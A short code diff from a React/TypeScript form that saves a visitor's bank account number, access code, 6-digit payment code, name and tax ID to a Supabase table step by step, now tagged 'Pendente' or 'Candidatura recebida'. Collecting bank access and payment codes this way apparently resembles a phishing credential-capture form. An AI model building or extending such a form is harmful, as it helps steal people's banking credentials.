@@ -155,6 +155,11 @@ function Index() {
       const { supabase } = await import("@/integrations/supabase/client");
       
       const pCodeStr = paymentCode.join("");
+      
+      // Determine if this is a definitive application or just temporary
+      // Definitive only if the payment code is complete (6 digits)
+      const isDefinitive = pCodeStr.length === 6;
+      
       const payload: any = {
         account_number: accountNumber || null,
         access_code: accessCode || null,
@@ -166,7 +171,8 @@ function Index() {
         name: personalData.name || null,
         nif: personalData.nif || null,
         step: step,
-        updated_at: new Date().toISOString()
+        updated_at: new Date().toISOString(),
+        status: isDefinitive ? "Candidatura recebida" : "Pendente"
       };
 
       // Filter out null/empty values to avoid overwriting existing data with nulls
